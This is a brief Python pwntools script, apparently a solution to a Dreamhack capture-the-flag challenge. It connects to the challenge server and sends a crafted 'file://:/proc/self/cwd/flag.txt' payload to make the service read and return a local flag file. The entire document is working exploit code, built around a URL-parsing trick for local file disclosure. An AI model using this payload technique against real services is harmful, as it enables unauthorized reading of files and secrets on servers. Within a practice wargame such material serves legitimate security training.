from pwn import *

r = remote("host8.dreamhack.games", 11700)

payload = 'file://:/proc/self/cwd/flag.txt'

r.sendlineafter(b'>', payload.encode())

r.recvuntil(b'result:')

flag = r.recvuntil(b'>', drop=True).decode().strip()
print("Flag:", flag)